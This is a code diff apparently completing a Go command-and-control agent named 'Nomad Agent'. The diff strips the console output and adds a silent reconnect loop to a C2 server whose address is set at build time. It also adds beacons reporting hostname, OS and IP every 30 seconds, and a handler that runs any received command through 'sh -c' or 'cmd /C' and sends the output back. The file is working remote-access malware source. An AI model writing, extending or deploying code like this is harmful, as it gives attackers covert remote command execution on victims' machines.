@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bufio"
+	"encoding/json"
 	"fmt"
 	"net"
 	"os"
@@ -11,41 +13,116 @@ import (
 	"github.com/google/uuid"
 )
 
-// In a real scenario, these would be obfuscated or encrypted.
-var serverAddr = "localhost:5555"
+type PacketType string
+
+const (
+	TypeBeacon   PacketType = "BEACON"
+	TypeCommand  PacketType = "COMMAND"
+	TypeResponse PacketType = "RESPONSE"
+)
+
+type Packet struct {
+	Type    PacketType      `json:"type"`
+	AgentID string          `json:"agent_id"`
+	Payload json.RawMessage `json:"payload"`
+}
+
 var agentID = uuid.New().String()
+var serverAddr = "localhost:5555" // Overridden during build
 
 func main() {
-	fmt.Printf("[*] Nomad Agent %s starting...\n", agentID)
-	
 	for {
 		conn, err := net.Dial("tcp", serverAddr)
 		if err != nil {
-			fmt.Printf("[-] Failed to connect to %s, retrying in 10s...\n", serverAddr)
 			time.Sleep(10 * time.Second)
 			continue
 		}
-		
-		fmt.Printf("[+] Connected to C2 at %s\n", serverAddr)
-		
-		// Beacon immediately
-		sendPacket(conn, "BEACON", map[string]string{
-			"hostname": getHostname(),
-			"os":       runtime.GOOS,
-			"ip":       conn.LocalAddr().String(),
-		})
-
-		// Simple loop to read and execute commands
-		scanner := net.NewConnReader(conn) // Simplified for demonstration
-		// ... (rest of the agent logic as previously implemented)
+		handleServer(conn)
 	}
 }
 
-func getHostname() string {
-	h, _ := os.Hostname()
-	return h
+func handleServer(conn net.Conn) {
+	defer conn.Close()
+
+	// Initial Beacon
+	sendBeacon(conn)
+
+	// Keep-alive/Command loop
+	reader := bufio.NewReader(conn)
+	ticker := time.NewTicker(30 * time.Second)
+	defer ticker.Stop()
+
+	go func() {
+		for range ticker.C {
+			sendBeacon(conn)
+		}
+	}()
+
+	for {
+		message, err := reader.ReadString('\n')
+		if err != nil {
+			return
+		}
+
+		var packet Packet
+		json.Unmarshal([]byte(message), &packet)
+
+		if packet.Type == TypeCommand {
+			var cmdPayload struct {
+				ID   int    `json:"id"`
+				Line string `json:"line"`
+			}
+			json.Unmarshal(packet.Payload, &cmdPayload)
+			
+			output := executeCommand(cmdPayload.Line)
+			sendResponse(conn, cmdPayload.ID, output)
+		}
+	}
 }
 
-func sendPacket(conn net.Conn, pType string, payload interface{}) {
-	// ... (implementation of JSON packet sending)
+func sendBeacon(conn net.Conn) {
+	hostname, _ := os.Hostname()
+	payload := map[string]string{
+		"hostname":     hostname,
+		"os":           runtime.GOOS,
+		"ip":           conn.LocalAddr().String(),
+		"country_code": "US", // Placeholder
+	}
+	payloadBytes, _ := json.Marshal(payload)
+	packet := Packet{
+		Type:    TypeBeacon,
+		AgentID: agentID,
+		Payload: payloadBytes,
+	}
+	packetBytes, _ := json.Marshal(packet)
+	conn.Write(append(packetBytes, '\n'))
+}
+
+func sendResponse(conn net.Conn, cmdID int, output string) {
+	payload := map[string]interface{}{
+		"command_id": cmdID,
+		"output":     output,
+	}
+	payloadBytes, _ := json.Marshal(payload)
+	packet := Packet{
+		Type:    TypeResponse,
+		AgentID: agentID,
+		Payload: payloadBytes,
+	}
+	packetBytes, _ := json.Marshal(packet)
+	conn.Write(append(packetBytes, '\n'))
+}
+
+func executeCommand(line string) string {
+	var cmd *exec.Cmd
+	if runtime.GOOS == "windows" {
+		cmd = exec.Command("cmd", "/C", line)
+	} else {
+		cmd = exec.Command("sh", "-c", line)
+	}
+	output, err := cmd.CombinedOutput()
+	if err != nil {
+		return fmt.Sprintf("Error: %v\n%s", err, string(output))
+	}
+	return string(output)
 }
